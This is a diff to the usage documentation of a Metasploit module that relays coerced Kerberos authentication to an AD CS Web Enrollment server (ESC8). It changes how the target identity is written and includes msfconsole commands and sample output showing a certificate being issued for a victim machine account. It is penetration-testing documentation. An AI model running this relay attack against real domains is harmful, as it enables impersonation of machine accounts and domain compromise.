@@ -31,7 +31,7 @@ with a coercion module. For the full end-to-end setup see the Scenarios section.
 2. Start `msfconsole`
 3. Do: `use auxiliary/server/relay/esc8_kerberos`
 4. Set `RHOSTS` to the AD CS Web Enrollment server
-5. Set `RELAY_IDENTITY` to the principal you will coerce (for example `WIN-VICTIM$@ad.example.com`)
+5. Set `RELAY_IDENTITY` to the principal you will coerce, in `DOMAIN\HOST$` form (for example `AD\WIN-VICTIM$`)
 6. Run the module and, in parallel, coerce the victim (see Scenarios)
 7. Wait for the Kerberos AP-REQ to be relayed and a certificate to be issued
 
@@ -56,11 +56,17 @@ or `User`).
 
 ### RELAY_IDENTITY
 
-The Kerberos principal you are coercing (for example `WIN-VICTIM$@ad.example.com`
-or `labuser@ad.example.com`). Because the relayed AP-REQ is encrypted, this
-identity is not recoverable from the wire; the module uses it to choose the
-certificate template (in `AUTO` mode) and to label its output. It does not need
-to match a password or key.
+The Kerberos principal you are coercing. Give it in `DOMAIN\HOST$` form (for
+example `AD\WIN-VICTIM$`, or `AD\labuser` for a user); the UPN form
+`HOST$@realm` (for example `WIN-VICTIM$@ad.example.com`) is also accepted and is
+converted internally. Because the relayed AP-REQ is encrypted, this identity is
+not recoverable from the wire; the module uses it to choose the certificate
+template (in `AUTO` mode) and to label its output. It does not need to match a
+password or key.
+
+A machine account must keep its trailing `$` (`AD\WIN-VICTIM$`), since that is
+how `AUTO` mode tells a machine account from a user and how the CSR subject is
+built.
 
 `RHOSTS` is the AD CS Web Enrollment host to relay to, and the module listens for
 the coerced Kerberos authentication on the SMB port (`SRVPORT`, default 445).
@@ -79,7 +85,7 @@ Terminal 1 - start the relay server:
 ```
 msf > use auxiliary/server/relay/esc8_kerberos
 msf auxiliary(server/relay/esc8_kerberos) > set RHOSTS ca.ad.example.com
-msf auxiliary(server/relay/esc8_kerberos) > set RELAY_IDENTITY WIN-VICTIM$@ad.example.com
+msf auxiliary(server/relay/esc8_kerberos) > set RELAY_IDENTITY AD\WIN-VICTIM$
 msf auxiliary(server/relay/esc8_kerberos) > set MODE SPECIFIC_TEMPLATE
 msf auxiliary(server/relay/esc8_kerberos) > set CERT_TEMPLATE Machine
 msf auxiliary(server/relay/esc8_kerberos) > run
@@ -104,7 +110,7 @@ AP-REQ, replays it to the CA, and saves the issued certificate:
 
 ```
 [*] New Kerberos request from 192.168.64.2
-[*] Received AP-REQ for coerced principal WIN-VICTIM$@ad.example.com
+[*] Received AP-REQ for coerced principal AD\WIN-VICTIM$
 [*] Relaying to next target http://ca.ad.example.com/certsrv/
 [+] Successfully authenticated against relay target http://ca.ad.example.com/certsrv/
 [*] Creating certificate request for WIN-VICTIM$ using the Machine template
